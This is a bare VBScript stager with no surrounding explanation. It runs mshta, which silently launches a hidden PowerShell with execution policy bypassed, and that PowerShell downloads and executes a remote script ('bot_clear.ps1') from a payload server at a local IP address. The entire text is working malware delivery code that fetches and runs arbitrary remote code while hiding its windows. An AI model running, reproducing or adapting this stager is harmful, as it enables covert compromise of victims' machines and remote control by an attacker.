Set s = CreateObject("WScript.Shell")
s.Run "mshta.exe javascript:var a=new ActiveXObject('WScript.Shell');a.Run('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.6:8000/static/payloads/bot_clear.ps1'')',0);window.close();", 0, False
